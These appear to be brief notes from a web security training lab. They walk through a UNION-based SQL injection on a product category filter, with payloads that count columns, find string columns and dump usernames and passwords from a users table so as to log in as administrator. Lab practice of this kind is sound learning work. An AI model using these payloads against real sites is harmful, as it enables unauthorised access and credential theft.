SQLi - Product category filter

End goal: Output the usernames and passwords in the table and login as the administrator usernames

Analysis:

1. Determin the number of columns
' order by 1--
' order by 2--
' order by 3--

=> 3 - 1 = 2 columns


2. Determine the data types of the columns
 
select a, b from products where category='Gifts

' UNION select 'a', null--
' UNION select 'a', 'a'--
=> both columns are of data types string

' UNION select username, password from users--

administrator
<password>